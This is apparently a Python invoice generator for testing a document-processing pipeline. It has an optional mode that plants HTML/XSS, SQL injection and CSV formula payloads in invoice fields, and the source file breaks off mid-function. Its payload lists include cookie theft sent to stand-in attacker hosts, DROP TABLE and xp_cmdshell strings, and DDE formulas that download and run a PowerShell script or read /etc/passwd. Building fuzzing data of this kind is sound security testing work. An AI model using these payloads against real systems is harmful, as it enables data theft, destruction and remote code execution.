#!/usr/bin/env python3
"""
Financial Invoice Generator
Generates randomized PDF invoices with realistic data, supporting:
- Single and multi-page invoices
- Rotated and off-center pages
- JSON metadata output matching the specified schema
- Security testing mode with dangerous payload injection:
  * HTML injection (XSS, iframe, script tags)
  * SQL injection (UNION, DROP TABLE, authentication bypass)
  * CSV formula injection (Excel formulas, command execution)
"""

import argparse
import json
import random
import uuid
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Dict, Any
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
from reportlab.lib import colors
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, PageBreak
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_LEFT, TA_RIGHT, TA_CENTER
from reportlab.pdfgen import canvas
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
from PyPDF2 import PdfReader, PdfWriter, Transformation
import io


# Sample data pools for randomization
COMPANY_NAMES = [
    "Contoso, Ltd.", "Fabrikam Industries", "Adventure Works", "Northwind Traders",
    "Wide World Importers", "Tailspin Toys", "Fourth Coffee", "Woodgrove Bank",
    "Litware Inc.", "A. Datum Corporation", "Blue Yonder Airlines", "City Power & Light",
    "Coho Winery", "Consolidated Messenger", "Proseware Inc.", "Southridge Video",
    "Trey Research", "Wingtip Toys", "Alpine Ski House", "Margie's Travel"
]

STREET_NAMES = [
    "Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine Rd", "Elm St", "Park Ave",
    "Washington Blvd", "Lincoln Way", "Forest St", "River Rd", "Lake Dr", "Hill St",
    "Valley Rd", "Mountain View", "Sunset Blvd", "Harbor Dr", "Beach Ave"
]

CITIES = [
    ("New York", "NY"), ("Los Angeles", "CA"), ("Chicago", "IL"), ("Houston", "TX"),
    ("Phoenix", "AZ"), ("Philadelphia", "PA"), ("San Antonio", "TX"), ("San Diego", "CA"),
    ("Dallas", "TX"), ("San Jose", "CA"), ("Austin", "TX"), ("Jacksonville", "FL"),
    ("Seattle", "WA"), ("Denver", "CO"), ("Boston", "MA"), ("Portland", "OR"),
    ("Buffalo", "NY"), ("Baltimore", "MD"), ("Miami", "FL"), ("Atlanta", "GA")
]

PRODUCT_DESCRIPTIONS = [
    ("Complete golf set. Left-handed", 350, 450),
    ("Complete golf set. Right-handed", 350, 450),
    ("Portable clip-on umbrella", 15, 35),
    ("Microfiber Golf Towels 3 Pack", 10, 20),
    ("Golf Tees 25 Pack", 3, 8),
    ("Premium Golf Balls 12 Pack", 25, 50),
    ("Golf Bag with Stand", 75, 150),
    ("Golf Glove - Premium Leather", 18, 35),
    ("Distance Rangefinder", 100, 250),
    ("Putting Green Mat 9ft", 40, 80),
    ("Golf Club Brush Cleaner", 8, 15),
    ("Golf Cart Bag", 120, 200),
    ("Alignment Training Aids", 20, 45),
    ("Golf Shoe Bag", 12, 25),
    ("Ball Marker Set", 5, 12),
    ("Divot Repair Tool", 6, 15),
    ("Golf Headcovers Set", 25, 50),
    ("Scorecard Holder Leather", 15, 30),
    ("Golf Swing Trainer", 30, 70),
    ("Waterproof Rain Jacket", 60, 120)
]

# Dangerous HTML payloads for pen testing
DANGEROUS_HTML_PAYLOADS = [
    # XSS Script Tags
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>window.location='http://malicious.com'</script>",
    "<script src='http://malicious.com/evil.js'></script>",
    
    # Event Handlers
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(document.domain)>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<svg/onload=alert('XSS')>",
    
    # Iframe Injections
    "<iframe src='http://malicious.com'></iframe>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
    
    # HTML Injection
    "<div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red'>HACKED</div>",
    "<marquee>SECURITY BREACH</marquee>",
    "<h1 style='color:red'>INJECTED CONTENT</h1>",
    
    # Form Hijacking
    "<form action='http://malicious.com'><input name='data'></form>",
    "<button onclick='alert(1)'>Click Me</button>",
    
    # Data Exfiltration
    "<img src='http://malicious.com/steal?data='+document.cookie>",
    "<link rel='stylesheet' href='http://malicious.com/steal.css'>",
    
    # Encoded Payloads
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    
    # Mixed Case Evasion
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<IMG SRC=javascript:alert('XSS')>",
    
    # Null Byte Injection
    "<script>alert('XSS')\x00</script>",
    
    # CSS Injection
    "<style>body{background:url('http://malicious.com/steal?data='+document.cookie)}</style>",
    "<style>@import'http://malicious.com/evil.css';</style>",
    
    # Object/Embed Tags
    "<object data='http://malicious.com/evil.swf'></object>",
    "<embed src='http://malicious.com/evil.swf'></embed>",
    
    # Template Injection Attempts
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    
    # SQL-like Injection (in HTML context)
    "' OR '1'='1",
    "1'; DROP TABLE users--",
    
    # Meta Refresh Redirect
    "<meta http-equiv='refresh' content='0;url=http://malicious.com'>",
    
    # Base Tag Hijacking
    "<base href='http://malicious.com/'>",
]

# SQL Injection payloads for pen testing
DANGEROUS_SQL_PAYLOADS = [
    # Basic SQL Injection
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "admin' --",
    "admin' #",
    "admin'/*",
    
    # UNION-based Injection
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT username, password FROM users--",
    "' UNION ALL SELECT NULL, NULL, NULL--",
    
    # Stacked Queries
    "'; DROP TABLE users--",
    "'; DROP DATABASE invoices--",
    "'; DELETE FROM invoices WHERE 1=1--",
    "'; UPDATE users SET password='hacked'--",
    "'; INSERT INTO admins VALUES ('hacker', 'password')--",
    
    # Time-based Blind SQL Injection
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT SLEEP(5)--",
    "' AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    
    # Boolean-based Blind SQL Injection
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND EXISTS(SELECT * FROM users)--",
    "' AND (SELECT COUNT(*) FROM users) > 0--",
    
    # Error-based SQL Injection
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND 1=CAST((SELECT @@version) AS int)--",
    "' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--",
    
    # Authentication Bypass
    "admin' OR '1'='1' --",
    "' OR '1'='1' --",
    "') OR ('1'='1' --",
    "1' OR '1' = '1' --",
    "1' OR '1' = '1' ({",
    "1' OR '1' = '1' /*",
    
    # Special Characters and Encoding
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 1=1#",
    "') or ('1'='1--",
    
    # NoSQL Injection
    "' || '1'=='1",
    "' && '1'=='1",
    "{$ne: null}",
    "{$gt: ''}",
    
    # Command Injection via SQL
    "'; exec xp_cmdshell('dir')--",
    "'; EXEC sp_executesql N'SELECT * FROM users'--",
    
    # Comment Injection
    "/**/",
    "--",
    "#",
    ";%00",
    
    # Multi-line Injection
    "1';\nDROP TABLE users;\n--",
    "'; exec master..xp_cmdshell 'ping attacker.com'--",
]

# CSV Formula Injection payloads for pen testing
DANGEROUS_CSV_FORMULA_PAYLOADS = [
    # Excel Formula Injection
    "=1+1",
    "=1+2+3+4",
    "=SUM(A1:A10)",
    "=A1+A2",
    
    # Command Execution
    "=cmd|'/c calc'!A1",
    "=cmd|'/c powershell IEX(wget attacker.com/shell.ps1)'!A1",
    "=system('calc')",
    
    # DDE (Dynamic Data Exchange) Injection
    "=cmd|'/c notepad'!A1",
    "@SUM(1+1)*cmd|'/c calc'!A1",
    "+cmd|'/c calc'!A1",
    "-cmd|'/c calc'!A1",
    
    # Hyperlink Injection
    "=HYPERLINK(\"http://malicious.com\", \"Click me\")",
    "=HYPERLINK(\"http://attacker.com/steal?data=\"&A1, \"Invoice\")",
    
    # Data Exfiltration
    "=IMPORTXML(CONCAT(\"http://attacker.com/?\",A1:A100), \"//a\")",
    "=WEBSERVICE(\"http://attacker.com/collect?data=\"&A1)",
    
    # Multiple Formula Prefixes
    "@SUM(1+1)",
    "+SUM(1+1)",
    "-SUM(1+1)",
    "=10+20",
    
    # Nested Formulas
    "=1+1+SUM(A1:A100)",
    "=IF(A1>0, \"YES\", \"NO\")",
    "=CONCATENATE(A1, \" \", A2)",
    
    # Tab/Newline Injection
    "=1+1\t=2+2",
    "=1+1\n=2+2",
    
    # CSV Injection with Delimiter Confusion
    "\",=1+1",
    "\"=1+1\"",
    
    # Google Sheets Specific
    "=IMPORTRANGE(\"https://docs.google.com/spreadsheets/d/[ID]\", \"Sheet1!A1:A10\")",
    "=IMAGE(\"http://attacker.com/track.png?data=\"&A1)",
    
    # LibreOffice Calc Specific
    "=DDE(\"calc\", \"file:///etc/passwd\", \"Sheet1\")",
    "=WEBSERVICE(\"http://attacker.com/\"&A1)",
    
    # PowerShell Execution
    "=cmd|'/c powershell -Command \"Start-Process calc\"'!A1",
    
    # File System Access
    "=cmd|'/c type C:\\Windows\\System32\\drivers\\etc\\hosts'!A1",
    
    # Complex Formulas
    "=IF(A1>0, cmd|'/c calc'!A1, \"Safe\")",
    "=IFERROR(1/0, cmd|'/c notepad'!A1)",
]


class InvoiceGenerator:
    """Generates randomized financial invoices"""
    
    def __init__(self, output_dir: str = "generated_invoices", inject_dangerous_html: bool = False):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.pdf_dir = self.output_dir / "pdfs"
        self.json_dir = self.output_dir / "json"
        self.pdf_dir.mkdir(exist_ok=True)
        self.json_dir.mkdir(exist_ok=True)
        self.inject_dangerous_html = inject_dangerous_html
        
        # Enable all injection types when dangerous mode is enabled
        self.inject_dangerous_sql = inject_dangerous_html  # SQL injection
        self.inject_dangerous_csv = inject_dangerous_html  # CSV formula injection
        
        # Register TrueType fonts that will be embedded in PDF
        # This ensures pdfjs can render them without needing standardFontDataUrl
        self._register_fonts()
    
    def _inject_html_payload(self, text: str, injection_probability: float = 0.3) -> str:
        """Randomly inject dangerous HTML payload into text for pen testing"""
        if not self.inject_dangerous_html:
            return text
        
        if random.random() < injection_probability:
            payload = random.choice(DANGEROUS_HTML_PAYLOADS)
            # Randomly choose injection position
            injection_type = random.choice(['append', 'prepend', 'replace'])
            
            if injection_type == 'append':
                return f"{text} {payload}"
            elif injection_type == 'prepend':
                return f"{payload} {text}"
            else:  # replace
                return payload
        
        return text
    
    def _inject_sql_payload(self, text: str, injection_probability: float = 0.3) -> str:
        """Randomly inject dangerous SQL payload into text for pen testing"""
        if not self.inject_dangerous_sql:
            return text
        
        if random.random() < injection_probability:
            payload = random.choice(DANGEROUS_SQL_PAYLOADS)
            # Randomly choose injection position
            injection_type = random.choice(['append', 'prepend', 'replace'])
            
            if injection_type == 'append':
                return f"{text} {payload}"
            elif injection_type == 'prepend':
                return f"{payload} {text}"
            else:  # replace
                return payload
        
        return text
    
    def _inject_csv_formula_payload(self, text: str, injection_probability: float = 0.3) -> str:
        """Randomly inject dangerous CSV formula payload into text for pen testing"""
        if not self.inject_dangerous_csv:
            return text
        
        if random.random() < injection_probability:
            payload = random.choice(DANGEROUS_CSV_FORMULA_PAYLOADS)
            # Randomly choose injection position
            injection_type = random.choice(['append', 'prepend', 'replace'])
            
            if injection_type == 'append':
                return f"{text} {payload}"
            elif injection_type == 'prepend':
                return f"{payload} {text}"
            else:  # replace
                return payload
        
        return text
    
    def _inject_payload(self, text: str, injection_probability: float = 0.3, injection_types: List[str] = None) -> str:
        """
        Randomly inject dangerous payloads into text for pen testing.
        
        Args:
            text: The text to potentially inject into
            injection_probability: Probability of injection (0.0-1.0)
            injection_types: List of injection types to use ['html', 'sql', 'csv']. If None, randomly chooses.
        
        Returns:
            Text with potential injection
        """
        if not (self.inject_dangerous_html or self.inject_dangerous_sql or self.inject_dangerous_csv):
            return text
        
        if random.random() >= injection_probability:
            return text
        
        # Determine available injection types
        available_types = []
        if self.inject_dangerous_html:
            available_types.append('html')
        if self.inject_dangerous_sql:
            available_types.append('sql')
        if self.inject_dangerous_csv:
            available_types.append('csv')
        
        # Choose injection type
        if injection_types:
            injection_type = random.choice([t for t in injection_types if t in available_types])
        else:
            injection_type = random.choice(available_types)
        
        # Select payload based on type
        if injection_type == 'html':
            payload = random.choice(DANGEROUS_HTML_PAYLOADS)
        elif injection_type == 'sql':
            payload = random.choice(DANGEROUS_SQL_PAYLOADS)
        else:  # csv
            payload = random.choice(DANGEROUS_CSV_FORMULA_PAYLOADS)
        
        # Randomly choose injection position
        position = random.choice(['append', 'prepend', 'replace'])
        
        if position == 'append':
            return f"{text} {payload}"
        elif position == 'prepend':
            return f"{payload} {text}"
        else:  # replace
            return payload

    
    def _escape_html_for_pdf(self, text: str) -> str:
        """Escape HTML special characters for safe PDF rendering"""
        if not text:
            return text
        # Escape HTML entities to prevent ReportLab parser errors
        return (text.replace('&', '&amp;')
                    .replace('<', '&lt;')
                    .replace('>', '&gt;')
                    .replace('"', '&quot;')
                    .replace("'", '&#39;'))
    
    def _register_fonts(self):
        """Register DejaVu TrueType fonts for embedding"""
        try:
            pdfmetrics.registerFont(TTFont('DejaVuSans', '/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf'))
            pdfmetrics.registerFont(TTFont('DejaVuSans-Bold', '/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf'))
            print("[FontSetup] Registered DejaVu fonts for embedding")
        except Exception as e:
            print(f"[FontSetup] Warning: Could not register DejaVu fonts: {e}")
            print("[FontSetup] Falling back to Helvetica (may not render in pdfjs without standardFontDataUrl)")

        
    def generate_random_date(self, start_year: int = 2020, end_year: int = 2026) -> datetime:
        """Generate a random date"""
        start = datetime(start_year, 1, 1)
        end = datetime(end_year, 12, 31)
        delta = end - start
        random_days = random.randint(0, delta.days)
        return start + timedelta(days=random_days)
    
    def generate_address(self) -> str:
        """Generate a random address"""
        street_num = random.randint(100, 9999)
        street = random.choice(STREET_NAMES)
        city, state = random.choice(CITIES)
        zipcode = random.randint(10000, 99999)
        
        # Inject dangerous payloads into address components
        # SQL injection for numeric/search fields, HTML for display fields
        street = self._inject_payload(street, injection_probability=0.1, injection_types=['html', 'sql'])
        city = self._inject_payload(city, injection_probability=0.1, injection_types=['html', 'sql'])
        
        return f"{street_num} {street}\n{city}, {state} {zipcode}"
    
    def generate_random_product_name(self) -> str:
        """Generate a completely random product name"""
        adjectives = [
            "Professional", "Premium", "Deluxe", "Standard", "Economy", "Heavy-Duty",
            "Compact", "Portable", "Industrial", "Commercial", "Digital", "Advanced",
            "Classic", "Modern", "Vintage", "Ultra", "Super", "Mega", "Mini", "Pro"
        ]
        
        materials = [
            "Steel", "Aluminum", "Carbon Fiber", "Plastic", "Wood", "Rubber",
            "Leather", "Fabric", "Composite", "Titanium", "Brass", "Copper"
        ]
        
        product_types = [
            "Widget", "Component", "Assembly", "Module", "Unit", "System",
            "Device", "Tool", "Instrument", "Equipment", "Apparatus", "Fixture",
            "Bracket", "Mount", "Adapter", "Connector", "Cable", "Sensor",
            "Controller", "Panel", "Housing", "Frame", "Support", "Base"
        ]
        
        specs = [
            "Model X", "Series A", "Type B", "Class C", "Grade 1", "Level 2",
            "Version 3", "Gen 4", "Mark V", "Plus", "Pro", "Elite", "Max"
        ]
        
        # Generate random combination
        parts = []
        if random.random() > 0.3:  # 70% chance of adjective
            parts.append(random.choice(adjectives))
        if random.random() > 0.5:  # 50% chance of material
            parts.append(random.choice(materials))
        parts.append(random.choice(product_types))
        if random.random() > 0.6:  # 40% chance of spec
            parts.append(random.choice(specs))
        
        return " ".join(parts)
    
    def generate_line_items(self, num_items: int = None) -> List[Dict[str, Any]]:
        """Generate random line items for invoice with completely random products"""
        if num_items is None:
            num_items = random.randint(3, 15)
        
        line_items = []
        for _ in range(num_items):
            description = self.generate_random_product_name()
            # Inject dangerous payloads into descriptions
            # HTML for display, CSV for exports, SQL for database queries
            description = self._inject_payload(description, injection_probability=0.15)
            
            quantity = random.randint(1, 10)
            # Generate completely random price between $5 and $500
            unit_price = round(random.uniform(5.0, 500.0), 2)
            total = round(quantity * unit_price, 2)
            product_code = random.choice(["", "", "", f"{random.randint(100, 999)}"]) # 75% chance of empty
            
            # Occasionally inject into product codes - SQL and CSV are more relevant for codes
            if product_code:
                product_code = self._inject_payload(product_code, injection_probability=0.1, injection_types=['sql', 'csv'])
            
            line_item = {
                "lineID": str(uuid.uuid4()),
                "description": description,
                "invoiceDescription": description,
                "quantity": quantity,
                "invoiceQuantity": quantity,
                "unitPrice": unit_price,
                "invoiceUnitPrice": unit_price,
                "total": total,
                "invoiceAmount": total,
                "productCode": product_code,
                "invoiceProductCode": product_code,
                "unit": "",
                "invoiceUnit": "",
                "poID": None,
                "poNumber": None
            }
            line_items.append(line_item)
        
        return line_items
    
    def calculate_totals(self, line_items: List[Dict[str, Any]]) -> Dict[str, float]:
        """Calculate invoice totals"""
        subtotal = sum(item["total"] for item in line_items)
        shipping = round(random.uniform(0, 25), 2) if random.random() > 0.3 else 0
        tax_rate = random.choice([0.05, 0.06, 0.07, 0.08, 0.0825, 0.09, 0.095])
        tax = round(subtotal * tax_rate, 2)
        total = round(subtotal + tax + shipping, 2)
        
        return {
            "subtotal": subtotal,
            "tax": tax,
            "shipping": shipping,
            "total": total
        }
    
    def create_invoice_pdf(
        self, 
        invoice_data: Dict[str, Any], 
        num_pages: int = 1,
        rotation: int = 0,
        offset_x: float = 0,
        offset_y: float = 0
    ) -> bytes:
        """Create PDF invoice with specified characteristics"""
        buffer = io.BytesIO()
        
        # Create PDF
        doc = SimpleDocTemplate(
            buffer,
            pagesize=letter,
            rightMargin=0.75*inch,
            leftMargin=0.75*inch,
            topMargin=0.75*inch,
            bottomMargin=0.75*inch
        )
        
        story = []
        styles = getSampleStyleSheet()
        
        # Custom styles with embedded fonts (don't inherit from default styles that use Helvetica)
        title_style = ParagraphStyle(
            'CustomTitle',
            fontName='DejaVuSans-Bold',
            fontSize=24,
            leading=28,
            textColor=colors.HexColor('#1a5490'),
            spaceAfter=12,
            spaceBefore=0,
            alignment=TA_CENTER
        )
        
        header_style = ParagraphStyle(
            'CustomHeader',
            fontName='DejaVuSans',
            fontSize=10,
            leading=12,
            textColor=colors.HexColor('#333333'),
            spaceBefore=0,
            spaceAfter=0
        )
        
        # Invoice header
        story.append(Paragraph("INVOICE", title_style))
        story.append(Spacer(1, 0.3*inch))
        
        # Vendor and customer info - escape HTML for safe PDF rendering
        vendor_name_safe = self._escape_html_for_pdf(invoice_data['vendorName'])
        customer_name_safe = self._escape_html_for_pdf(invoice_data['customerName'])
        vendor_address_safe = self._escape_html_for_pdf(invoice_data['vendorAddress']).replace(chr(10), '<br/>')
        customer_address_safe = self._escape_html_for_pdf(invoice_data['customerAddress']).replace(chr(10), '<br/>')
        
        header_data = [
            [
                Paragraph(f"<b>From:</b><br/>{vendor_name_safe}<br/>{vendor_address_safe}", header_style),
                Paragraph(f"<b>To:</b><br/>{customer_name_safe}<br/>{customer_address_safe}", header_style)
            ]
        ]
        
        header_table = Table(header_data, colWidths=[3.25*inch, 3.25*inch])
        header_table.setStyle(TableStyle([
            ('VALIGN', (0, 0), (-1, -1), 'TOP'),
            ('TOPPADDING', (0, 0), (-1, -1), 0),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 12),
        ]))
        story.append(header_table)
        story.append(Spacer(1, 0.2*inch))
        
        # Invoice details - escape HTML for safe PDF rendering
        invoice_number_safe = self._escape_html_for_pdf(str(invoice_data['invoiceNumber']))
        po_number_safe = self._escape_html_for_pdf(str(invoice_data.get('poNumber', '')))
        
        detail_data = [
            ["Invoice Number:", invoice_number_safe],
            ["Invoice Date:", invoice_data['invoiceDate']],
            ["Due Date:", invoice_data['dueDate']],
        ]
        
        if invoice_data.get('poNumber'):
            detail_data.append(["PO Number:", po_number_safe])
        
        detail_table = Table(detail_data, colWidths=[2*inch, 4.5*inch])
        detail_table.setStyle(TableStyle([
            ('FONTNAME', (0, 0), (0, -1), 'DejaVuSans-Bold'),
            ('FONTNAME', (1, 0), (1, -1), 'DejaVuSans'),
            ('FONTSIZE', (0, 0), (-1, -1), 10),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
        ]))
        story.append(detail_table)
        story.append(Spacer(1, 0.3*inch))
        
        # Line items - split across pages if needed
        items_per_page = 15 if num_pages == 1 else 20
        line_items = invoice_data['lineItems']
        
        for page_idx in range(num_pages):
            if page_idx > 0:
                story.append(PageBreak())
                story.append(Paragraph(f"INVOICE {invoice_data['invoiceNumber']} (Continued)", title_style))
                story.append(Spacer(1, 0.3*inch))
            
            start_idx = page_idx * items_per_page
            end_idx = min((page_idx + 1) * items_per_page, len(line_items))
            page_items = line_items[start_idx:end_idx]
            
            if not page_items and page_idx > 0:
                continue
            
            # Line items table - escape HTML in descriptions for safe PDF rendering
            table_data = [["Description", "Qty", "Unit Price", "Amount"]]
            
            for item in page_items:
                description_safe = self._escape_html_for_pdf(item['description'])
                table_data.append([
                    description_safe,
                    str(item['quantity']),
                    f"${item['unitPrice']:.2f}",
                    f"${item['total']:.2f}"
                ])
            
            # Add totals on last page
            if page_idx == num_pages - 1 or end_idx >= len(line_items):
                table_data.append(["", "", "Subtotal:", f"${invoice_data['invoiceSubtotal']:.2f}"])
                if invoice_data.get('invoiceShipping', 0) > 0:
                    table_data.append(["", "", "Shipping:", f"${invoice_data['invoiceShipping']:.2f}"])
                table_data.append(["", "", "Tax:", f"${invoice_data['invoiceTax']:.2f}"])
                table_data.append(["", "", "Total:", f"${invoice_data['invoiceTotal']:.2f}"])
            
            items_table = Table(table_data, colWidths=[3.5*inch, 0.75*inch, 1*inch, 1.25*inch])
            items_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#1a5490')),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (1, 0), (-1, -1), 'RIGHT'),
                ('FONTNAME', (0, 0), (-1, 0), 'DejaVuSans-Bold'),  # Header row
                ('FONTNAME', (0, 1), (-1, -1), 'DejaVuSans'),  # All data rows
                ('FONTNAME', (0, -4), (-1, -1), 'DejaVuSans-Bold'),  # Last 4 rows (totals)
                ('FONTSIZE', (0, 0), (-1, 0), 10),
                ('FONTSIZE', (0, 1), (-1, -1), 9),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 8),
                ('TOPPADDING', (0, 0), (-1, 0), 8),
                ('GRID', (0, 0), (-1, -1), 0.5, colors.grey),
                ('ROWBACKGROUNDS', (0, 1), (-1, -5 if page_idx == num_pages - 1 else -1), [colors.white, colors.HexColor('#f0f0f0')]),
            ]))
            
            story.append(items_table)
        
        # Build PDF
        doc.build(story)
        pdf_bytes = buffer.getvalue()
        buffer.close()
        
        # Always flatten PDF to ensure no editable content
        # This removes any form fields, annotations, or interactive elements
        pdf_bytes = self.flatten_pdf(pdf_bytes, rotation, offset_x, offset_y)
        
        return pdf_bytes
    
    def flatten_pdf(self, pdf_bytes: bytes, rotation: int = 0, offset_x: float = 0, offset_y: float = 0) -> bytes:
        """
        Flatten PDF to ensure all content is non-editable and apply transformations.
        This removes any form fields, annotations, or interactive elements.
        """
        import math
        input_pdf = PdfReader(io.BytesIO(pdf_bytes))
        output_pdf = PdfWriter()
        
        for page in input_pdf.pages:
            # Remove any form fields or annotations to ensure content is flattened
            if '/Annots' in page:
                del page['/Annots']
            if '/AcroForm' in page:
                del page['/AcroForm']
            
            # Get page dimensions
            page_width = float(page.mediabox.width)
            page_height = float(page.mediabox.height)
            
            # Apply transformations if specified
            if rotation != 0 or offset_x != 0 or offset_y != 0:
                # Calculate center point for rotation
                center_x = page_width / 2
                center_y = page_height / 2
                
                if rotation != 0:
                    # Convert rotation to radians
                    angle_rad = math.radians(rotation)
                    cos_angle = math.cos(angle_rad)
                    sin_angle = math.sin(angle_rad)
                    
                    # Create custom transformation matrix for arbitrary rotation
                    # Rotation matrix around center: translate to origin, rotate, translate back
                    op = Transformation().translate(tx=-center_x, ty=-center_y)
                    page.add_transformation(op)
                    
                    # Apply rotation matrix manually
                    op = Transformation((cos_angle, sin_angle, -sin_angle, cos_angle, 0, 0))
                    page.add_transformation(op)
                    
                    # Translate back and apply offset
                    op = Transformation().translate(tx=center_x + offset_x, ty=center_y + offset_y)
                    page.add_transformation(op)
                else:
                    # Apply only translation
                    page.add_transformation(Transformation().translate(tx=offset_x, ty=offset_y))
            
            output_pdf.add_page(page)
        
        # Ensure the output PDF doesn't contain form data
        # PyPDF2 PdfWriter doesn't copy form fields by default, but be explicit
        output_pdf._root_object.get('/AcroForm', None)  # This ensures no form exists
        
        output_buffer = io.BytesIO()
        output_pdf.write(output_buffer)
        output_buffer.seek(0)
        return output_buffer.getvalue()
    
    def generate_invoice(
        self, 
        entity_id: int,
        document_id: int,
        num_pages: int = 1,
        rotation: int = 0,
        offset_x: float = 0,
        offset_y: float = 0
    ) -> Dict[str, Any]:
        """Generate a complete invoice with PDF and metadata"""
        
        # Generate random invoice data
        invoice_date = self.generate_random_date()
        due_date = invoice_date + timedelta(days=random.randint(15, 45))
        
        vendor_name = random.choice(COMPANY_NAMES)
        customer_name = random.choice([c for c in COMPANY_NAMES if c != vendor_name])
        
        # Inject dangerous payloads into vendor/customer names
        # HTML for display, SQL for database queries
        vendor_name = self._inject_payload(vendor_name, injection_probability=0.2, injection_types=['html', 'sql'])
        customer_name = self._inject_payload(customer_name, injection_probability=0.2, injection_types=['html', 'sql'])
        
        invoice_number = f"{random.randint(1000000, 9999999)}"
        po_number = f"{random.randint(100, 999)}" if random.random() > 0.5 else ""
        
        # Inject dangerous payloads into invoice/PO numbers
        # SQL for database queries, CSV for exports
        invoice_number = self._inject_payload(invoice_number, injection_probability=0.15, injection_types=['sql', 'csv'])
        if po_number:
            po_number = self._inject_payload(po_number, injection_probability=0.1, injection_types=['sql', 'csv'])
        
        # Generate line items based on number of pages
        base_items = 8 if num_pages == 1 else 15
        variance = random.randint(-3, 5)
        num_items = max(3, base_items + variance + (num_pages - 1) * 15)
        
        line_items = self.generate_line_items(num_items)
        totals = self.calculate_totals(line_items)
        
        invoice_data = {
            "invoiceNumber": invoice_number,
            "invoiceDate": invoice_date.strftime("%b %d, %Y"),
            "dueDate": due_date.strftime("%b %d, %Y"),
            "vendorName": vendor_name,
            "vendorAddress": self.generate_address(),
            "customerName": customer_name,
            "customerAddress": self.generate_address(),
            "invoiceTotal": totals["total"],
            "totalAmount": totals["total"],
            "invoiceSubtotal": totals["subtotal"],
            "subTotal": totals["subtotal"],
            "invoiceTax": totals["tax"],
            "taxAmount": totals["tax"],
            "invoiceShipping": totals["shipping"],
            "shippingFreight": totals["shipping"],
            "lineItems": line_items,
            "poNumber": po_number,
            "purchaseOrderNumber": po_number,
            "customer": customer_name,
            "vendor": vendor_name,
        }
        
        # Generate PDF
        pdf_bytes = self.create_invoice_pdf(
            invoice_data, 
            num_pages=num_pages,
            rotation=rotation,
            offset_x=offset_x,
            offset_y=offset_y
        )
        
        # Save PDF - add '_dangerous_' label if HTML injection is enabled
        # Clean invoice_number for filename (remove special characters)
        clean_invoice_number = ''.join(c if c.isalnum() else '_' for c in str(invoice_number))
        dangerous_label = "_dangerous_" if self.inject_dangerous_html else ""
        pdf_filename = f"invoice{dangerous_label}_{document_id}_{clean_invoice_number}.pdf"
        pdf_path = self.pdf_dir / pdf_filename
        with open(pdf_path, "wb") as f:
            f.write(pdf_bytes)
        
        # Create metadata JSON
        processing_date = datetime.now().isoformat() + "Z"
        extracted_data = {
            **invoice_data,
            "extractionMethod": "hybrid",
            "processingDate": processing_date,
            "shippingFreightAllowance": 0,
            "surcharges": 0,
            "paymentTerms": "",
            "invoicePaymentTerm": "",
            "id": str(document_id),
            "invoiceID": str(document_id),
            "invoiceSubtotalTaxShipping": round(totals["tax"] + totals["shipping"], 2),
            "imageUrls": [f"file://{pdf_path.absolute()}"],
            "imagePrefixes": [pdf_filename],
            "pdfImages": {
                "imageUrls": [f"file://{pdf_path.absolute()}"],
                "boundingBoxesUrl": ""
            }
        }
        
        metadata = {
            "entityID": entity_id,
            "documentID": document_id,
            "extractedEntitiesPayload": json.dumps({
                "success": True,
                "documentId": str(document_id),
                "extractedEntityId": str(entity_id),
                "extractedData": extracted_data,
                "processingSteps": {
                    "imagesGenerated": True,
                    "boundingRegionsExtracted": True,
                    "aiExtractionCompleted": True,
                    "invoiceMapped": True,
                    "transformationCompleted": True,
                    "postProcessingCompleted": True
                },
                "completedAt": processing_date
            }),
            "stage": "intake",
            "status": "completed",
            "substatus": "Extraction Successful",
            "createdOn": processing_date,
            "modifiedOn": processing_date,
            "dateExported": None,
            "dateFiled": None
        }
        
        # Save metadata JSON - add '_dangerous_' label if HTML injection is enabled
        dangerous_label = "_dangerous_" if self.inject_dangerous_html else ""
        json_filename = f"invoice{dangerous_label}_{document_id}_{clean_invoice_number}.json"
        json_path = self.json_dir / json_filename
        with open(json_path, "w") as f:
            json.dump(metadata, f, indent=2)
        
        return {
            "pdf_path": str(pdf_path),
            "json_path": str(json_path),
            "metadata": metadata,
            "invoice_data": invoice_data
        }
    
    def generate_batch(
        self, 
        count: int,
        multi_page_ratio: float = 0.3,
        rotation_ratio: float = 0.2,
        offset_ratio: float = 0.2
    ) -> List[Dict[str, Any]]:
        """Generate a batch of invoices"""
        results = []
        
        print(f"Generating {count} invoices...")
        print(f"  - Multi-page ratio: {multi_page_ratio*100:.0f}%")
